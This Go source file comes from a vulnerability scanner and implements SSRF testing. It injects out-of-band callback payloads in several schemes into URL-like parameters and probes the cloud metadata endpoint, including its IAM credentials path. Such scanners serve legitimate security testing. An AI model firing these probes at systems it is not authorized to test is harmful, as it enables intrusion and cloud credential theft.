package scanner

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/spondonsaha/vexora/api/internal/models"
	"github.com/spondonsaha/vexora/api/internal/store"
)

// SSRFTool is the ad-hoc tool name for server-side request forgery testing.
const SSRFTool = "ssrf"

// ssrfOptions are the knobs accepted from the API/UI.
type ssrfOptions struct {
	MaxTargets    int  `json:"max_targets"`
	TestAllParams bool `json:"test_all_params"`
}

// ssrfParamNames is the pre-filtered set of SSRF-prone parameter names mined
// from already-collected endpoints (spec: url|uri|path|dest|redirect|...).
var ssrfParamNames = map[string]struct{}{
	"url": {}, "uri": {}, "path": {}, "dest": {}, "destination": {}, "destinationurl": {},
	"destination_url": {}, "redirect": {}, "redirect_uri": {}, "redirect_url": {}, "redirecturl": {},
	"continue": {}, "continueurl": {}, "continue_url": {}, "return": {}, "returnurl": {},
	"return_url": {}, "returnto": {}, "return_to": {}, "next": {}, "nexturl": {}, "next_url": {},
	"callback": {}, "callbackurl": {}, "callback_url": {}, "webhook": {}, "webhookurl": {},
	"webhook_url": {}, "avatar": {}, "avatarurl": {}, "avatar_url": {}, "image": {}, "imageurl": {},
	"image_url": {}, "img": {}, "imgurl": {}, "fetch": {}, "proxy": {}, "proxyurl": {}, "proxy_url": {},
	"src": {}, "source": {}, "href": {}, "link": {}, "site": {}, "website": {}, "window": {}, "feed": {},
	"feedurl": {}, "feed_url": {}, "host": {}, "hostname": {}, "port": {}, "out": {}, "outurl": {},
	"out_url": {}, "view": {}, "viewurl": {}, "import": {}, "load": {}, "loadurl": {}, "load_url": {},
	"target": {}, "targeturl": {}, "target_url": {}, "to": {}, "goto": {}, "go": {}, "ref": {},
	"reference": {}, "domain": {}, "domainurl": {}, "file": {}, "fileurl": {}, "file_url": {},
	"page": {}, "pageurl": {}, "page_url": {}, "service": {}, "endpoint": {}, "api": {}, "remote": {},
	"origin": {}, "resource": {}, "u": {}, "r": {}, "forward": {}, "forwardurl": {}, "forward_url": {},
	"data": {}, "json": {}, "format": {}, "redirectto": {}, "redirect_to": {},
}

// ssrfCandidate is one (URL, parameter) pair to test.
type ssrfCandidate struct {
	URL   string
	Param string
}

// oobToken mirrors the OOB service's token payload.
type oobToken struct {
	ID       string `json:"id"`
	Hostname string `json:"hostname"`
}

// oobInteraction mirrors the OOB service's interaction payload.
type oobInteraction struct {
	TokenID       string `json:"token_id"`
	Protocol      string `json:"protocol"`
	RemoteAddress string `json:"remote_address"`
	FullID        string `json:"full_id"`
	Timestamp     string `json:"timestamp"`
	RawRequest    string `json:"raw_request"`
}

// metadataProbes are in-band cloud-metadata URLs used to flag obvious reads.
var metadataProbes = []string{
	"http://169.254.169.254/latest/meta-data/",
	"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
}

// metadataSignatures are substrings that appear in cloud metadata responses.
var metadataSignatures = []string{
	"ami-id", "instance-id", "instance-type", "iam/", "accesskeyid", "secretaccesskey",
	"computemetadata", "subscriptionid", "placement/", "local-ipv4", "public-keys",
}

// runSSRFAdHoc discovers SSRF-prone parameters, injects out-of-band payloads and
// confirms the vulnerability when the target calls back to the OOB service.
func (r *Runner) runSSRFAdHoc(ctx context.Context, job *models.ScanJob, target *models.ScopeTarget, root string) Result {
	if !r.cfg.SSRFEnabled {
		return Result{Status: models.ScanFailed, ExitCode: -1, Err: errors.New("ssrf scanning is disabled")}
	}
	if strings.TrimSpace(r.cfg.OOBServiceURL) == "" {
		return Result{Status: models.ScanFailed, ExitCode: -1, Err: errors.New("OOB service is not configured (set OOB_SERVICE_URL)")}
	}

	opts := ssrfOptions{MaxTargets: r.cfg.SSRFMaxTargets}
	if len(job.Options) > 0 {
		var parsed ssrfOptions
		if err := json.Unmarshal(job.Options, &parsed); err == nil {
			if parsed.MaxTargets > 0 {
				opts.MaxTargets = parsed.MaxTargets
			}
			opts.TestAllParams = parsed.TestAllParams
		}
	}
	if opts.MaxTargets < 1 {
		opts.MaxTargets = r.cfg.SSRFMaxTargets
	}

	stdoutPath := r.rawPath(job.ID, "out")
	stderrPath := r.rawPath(job.ID, "err")

	candidates, err := r.ssrfCandidates(ctx, target, opts)
	if err != nil {
		return Result{Status: models.ScanFailed, ExitCode: -1, Err: err}
	}
	if len(candidates) == 0 {
		msg := "no SSRF-style parameters found: run the wildcard workflow (URL discovery) first, or enable 'test all parameters'"
		writeRawFile(stdoutPath, msg+"\n")
		writeRawFile(stderrPath, "")
		return Result{Status: models.ScanFailed, ExitCode: -1, StdoutPath: stdoutPath, StderrPath: stderrPath, Err: errors.New(msg)}
	}

	tokens, err := r.oobRequestTokens(ctx, len(candidates))
	if err != nil {
		writeRawFile(stdoutPath, "")
		writeRawFile(stderrPath, "oob: "+err.Error()+"\n")
		return Result{Status: models.ScanFailed, ExitCode: -1, StdoutPath: stdoutPath, StderrPath: stderrPath, Err: fmt.Errorf("oob service: %w", err)}
	}
	if len(tokens) < len(candidates) {
		candidates = candidates[:len(tokens)]
	}

	// Issue OOB payloads for every candidate (direct http/https + scheme smuggling).
	client := r.ssrfHTTPClient()
	concurrency := r.cfg.SSRFConcurrency
	if concurrency < 1 {
		concurrency = 1
	}
	sem := make(chan struct{}, concurrency)
	var wg sync.WaitGroup
	for i := range candidates {
		wg.Add(1)
		sem <- struct{}{}
		go func(cand ssrfCandidate, token oobToken) {
			defer wg.Done()
			defer func() { <-sem }()
			for _, payload := range ssrfPayloads(token.Hostname) {
				r.ssrfSend(ctx, client, cand, payload)
			}
		}(candidates[i], tokens[i])
	}
	wg.Wait()

	// Best-effort in-band metadata probes (independent of OOB callbacks).
	metadataRows := r.ssrfMetadataProbes(ctx, client, candidates)

	// Give the target time to resolve and connect back to the OOB host.
	wait := time.Duration(r.cfg.SSRFPollSeconds) * time.Second
	select {
	case <-ctx.Done():
	case <-time.After(wait):
	}

	interactions, err := r.oobFetchInteractions(ctx)
	if err != nil {
		log.Printf("job %s: ssrf oob poll failed: %v", job.ID, err)
	}
	confirmedByToken := make(map[string]oobInteraction, len(interactions))
	for _, interaction := range interactions {
		if interaction.TokenID == "" {
			continue
		}
		if _, ok := confirmedByToken[interaction.TokenID]; !ok {
			confirmedByToken[interaction.TokenID] = interaction
		}
	}

	rows := make([]store.SSRFFindingRow, 0, len(candidates)+len(confirmedByToken)+len(metadataRows))
	events := make([]string, 0, len(candidates)+len(confirmedByToken))

	for i, cand := range candidates {
		rows = append(rows, store.SSRFFindingRow{
			URL:         cand.URL,
			Parameter:   cand.Param,
			Method:      http.MethodGet,
			FindingType: "candidate",
			Severity:    "info",
		})

		if interaction, ok := confirmedByToken[tokens[i].ID]; ok {
			payload := "http://" + tokens[i].Hostname + "/"
			evidence := fmt.Sprintf("OOB %s interaction from %s to %s at %s",
				interaction.Protocol, interaction.RemoteAddress, tokens[i].Hostname, interaction.Timestamp)
			rows = append(rows, store.SSRFFindingRow{
				URL:           cand.URL,
				Parameter:     cand.Param,
				Payload:       payload,
				Method:        http.MethodGet,
				FindingType:   "ssrf_oob",
				Severity:      "critical",
				Confirmed:     true,
				Protocol:      interaction.Protocol,
				RemoteAddress: interaction.RemoteAddress,
				Evidence:      evidence,
			})
			events = append(events, ssrfEventJSON(map[string]any{
				"event":          "confirmed",
				"url":            cand.URL,
				"parameter":      cand.Param,
				"payload":        payload,
				"protocol":       interaction.Protocol,
				"remote_address": interaction.RemoteAddress,
			}))
		} else {
			events = append(events, ssrfEventJSON(map[string]any{
				"event":     "candidate",
				"url":       cand.URL,
				"parameter": cand.Param,
			}))
		}
	}
	rows = append(rows, metadataRows...)
	for _, m := range metadataRows {
		events = append(events, ssrfEventJSON(map[string]any{
			"event":     "metadata",
			"url":       m.URL,
			"parameter": m.Parameter,
			"payload":   m.Payload,
			"evidence":  m.Evidence,
		}))
	}
	events = append(events, ssrfEventJSON(map[string]any{
		"event":      "done",
		"candidates": len(candidates),
		"confirmed":  len(confirmedByToken),
		"metadata":   len(metadataRows),
	}))

	writeRawFile(stdoutPath, strings.Join(events, "\n")+"\n")
	writeRawFile(stderrPath, "")

	stored, err := r.store.UpsertSSRFFindings(ctx, target.ID, job.ID, rows)
	if err != nil {
		return Result{Status: models.ScanFailed, ExitCode: -1, StdoutPath: stdoutPath, StderrPath: stderrPath, Err: fmt.Errorf("store ssrf findings: %w", err)}
	}

	log.Printf("job %s: ssrf tested %d parameter(s), %d OOB-confirmed, %d metadata (%d stored)",
		job.ID, len(candidates), len(confirmedByToken), len(metadataRows), stored)

	return Result{Status: models.ScanDone, ExitCode: 0, StdoutPath: stdoutPath, StderrPath: stderrPath}
}

// ssrfCandidates mines the endpoint store for SSRF-prone parameters, or every
// parameterised URL when test-all is enabled.
func (r *Runner) ssrfCandidates(ctx context.Context, target *models.ScopeTarget, opts ssrfOptions) ([]ssrfCandidate, error) {
	endpoints, err := r.store.ListEndpointsByScopeTarget(ctx, target.ID)
	if err != nil {
		return nil, fmt.Errorf("list endpoints: %w", err)
	}

	seen := map[string]struct{}{}
	out := make([]ssrfCandidate, 0)
	for _, ep := range endpoints {
		if ep.URL == nil {
			continue
		}
		raw := strings.TrimSpace(*ep.URL)
		if raw == "" || !strings.Contains(raw, "?") {
			continue
		}
		parsed, err := url.Parse(raw)
		if err != nil {
			continue
		}
		for name := range parsed.Query() {
			if !opts.TestAllParams {
				if _, ok := ssrfParamNames[strings.ToLower(name)]; !ok {
					continue
				}
			}
			key := raw + "\x00" + name
			if _, ok := seen[key]; ok {
				continue
			}
			seen[key] = struct{}{}
			out = append(out, ssrfCandidate{URL: raw, Param: name})
		}
	}

	sort.Slice(out, func(i, j int) bool {
		if out[i].URL == out[j].URL {
			return out[i].Param < out[j].Param
		}
		return out[i].URL < out[j].URL
	})

	if len(out) > opts.MaxTargets {
		log.Printf("ssrf: %d candidate(s) truncated to %d", len(out), opts.MaxTargets)
		out = out[:opts.MaxTargets]
	}
	return out, nil
}

// ssrfPayloads returns the out-of-band payloads for a token hostname. Multiple
// schemes are used to catch servers that only fetch a specific protocol.
func ssrfPayloads(host string) []string {
	return []string{
		"http://" + host + "/",
		"https://" + host + "/",
		"gopher://" + host + ":80/_",
		"dict://" + host + ":80/",
	}
}

// ssrfSend substitutes the parameter value with the payload and issues the request.
func (r *Runner) ssrfSend(ctx context.Context, client *http.Client, cand ssrfCandidate, payload string) {
	target, err := replaceQueryParam(cand.URL, cand.Param, payload)
	if err != nil {
		return
	}
	timeout := time.Duration(r.cfg.SSRFRequestTimeout) * time.Second
	if timeout <= 0 {
		timeout = 10 * time.Second
	}
	reqCtx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	req, err := http.NewRequestWithContext(reqCtx, http.MethodGet, target, nil)
	if err != nil {
		return
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; Vexora/1.0; +https://github.com/spondonsaha/vexora)")

	resp, err := client.Do(req)
	if err != nil {
		return
	}
	_, _ = io.Copy(io.Discard, io.LimitReader(resp.Body, 1<<16))
	_ = resp.Body.Close()
}

// ssrfMetadataProbes issues in-band cloud-metadata URLs and flags reads. Probes
// run concurrently (bounded by SSRFConcurrency) so a large candidate set stays
// well within the tool timeout.
func (r *Runner) ssrfMetadataProbes(ctx context.Context, client *http.Client, candidates []ssrfCandidate) []store.SSRFFindingRow {
	concurrency := r.cfg.SSRFConcurrency
	if concurrency < 1 {
		concurrency = 1
	}
	timeout := time.Duration(r.cfg.SSRFRequestTimeout) * time.Second
	if timeout <= 0 {
		timeout = 10 * time.Second
	}

	var (
		mu   sync.Mutex
		rows []store.SSRFFindingRow
		wg   sync.WaitGroup
		sem  = make(chan struct{}, concurrency)
	)
	for _, cand := range candidates {
		wg.Add(1)
		sem <- struct{}{}
		go func(cand ssrfCandidate) {
			defer wg.Done()
			defer func() { <-sem }()
			for _, probe := range metadataProbes {
				target, err := replaceQueryParam(cand.URL, cand.Param, probe)
				if err != nil {
					continue
				}
				reqCtx, cancel := context.WithTimeout(ctx, timeout)
				req, err := http.NewRequestWithContext(reqCtx, http.MethodGet, target, nil)
				if err != nil {
					cancel()
					continue
				}
				req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; Vexora/1.0)")
				resp, err := client.Do(req)
				if err != nil {
					cancel()
					continue
				}
				body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<16))
				_ = resp.Body.Close()
				status := resp.StatusCode
				cancel()

				if sig, ok := matchMetadataSignature(body); ok {
					mu.Lock()
					rows = append(rows, store.SSRFFindingRow{
						URL:         cand.URL,
						Parameter:   cand.Param,
						Payload:     probe,
						Method:      http.MethodGet,
						FindingType: "metadata_read",
						Severity:    "critical",
						Confirmed:   true,
						Evidence:    fmt.Sprintf("response contained cloud-metadata signature %q (probe %s, HTTP %d)", sig, probe, status),
					})
					mu.Unlock()
					break
				}
			}
		}(cand)
	}
	wg.Wait()
	return rows
}

func matchMetadataSignature(body []byte) (string, bool) {
	lower := strings.ToLower(string(body))
	for _, sig := range metadataSignatures {
		if strings.Contains(lower, sig) {
			return sig, true
		}
	}
	return "", false
}

func replaceQueryParam(rawURL, param, value string) (string, error) {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return "", err
	}
	query := parsed.Query()
	query.Set(param, value)
	parsed.RawQuery = query.Encode()
	return parsed.String(), nil
}

// ssrfHTTPClient returns a client that never follows redirects so the payload
// target sees the raw request.
func (r *Runner) ssrfHTTPClient() *http.Client {
	timeout := time.Duration(r.cfg.SSRFRequestTimeout) * time.Second
	if timeout <= 0 {
		timeout = 10 * time.Second
	}
	return &http.Client{
		Timeout: timeout,
		CheckRedirect: func(*http.Request, []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
}

func ssrfEventJSON(fields map[string]any) string {
	encoded, err := json.Marshal(fields)
	if err != nil {
		return "{}"
	}
	return string(encoded)
}

// oobRequestTokens asks the OOB service for count unique hostnames.
func (r *Runner) oobRequestTokens(ctx context.Context, count int) ([]oobToken, error) {
	if count < 1 {
		count = 1
	}
	body, err := json.Marshal(map[string]int{"count": count})
	if err != nil {
		return nil, err
	}

	reqCtx, cancel := context.WithTimeout(ctx, 20*time.Second)
	defer cancel()

	endpoint := strings.TrimRight(r.cfg.OOBServiceURL, "/") + "/tokens"
	req, err := http.NewRequestWithContext(reqCtx, http.MethodPost, endpoint, bytes.NewReader(body))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("request tokens: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		msg, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		return nil, fmt.Errorf("oob service returned %d: %s", resp.StatusCode, strings.TrimSpace(string(msg)))
	}

	var parsed struct {
		Domain string     `json:"domain"`
		Tokens []oobToken `json:"tokens"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&parsed); err != nil {
		return nil, fmt.Errorf("decode tokens: %w", err)
	}
	if len(parsed.Tokens) == 0 {
		return nil, errors.New("oob service returned no tokens")
	}
	return parsed.Tokens, nil
}

// oobFetchInteractions retrieves buffered interactions from the OOB service.
func (r *Runner) oobFetchInteractions(ctx context.Context) ([]oobInteraction, error) {
	reqCtx, cancel := context.WithTimeout(ctx, 20*time.Second)
	defer cancel()

	endpoint := strings.TrimRight(r.cfg.OOBServiceURL, "/") + "/interactions"
	req, err := http.NewRequestWithContext(reqCtx, http.MethodGet, endpoint, nil)
	if err != nil {
		return nil, err
	}

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("fetch interactions: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("oob service returned %d", resp.StatusCode)
	}

	var parsed struct {
		Interactions []oobInteraction `json:"interactions"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&parsed); err != nil {
		return nil, fmt.Errorf("decode interactions: %w", err)
	}
	return parsed.Interactions, nil
}
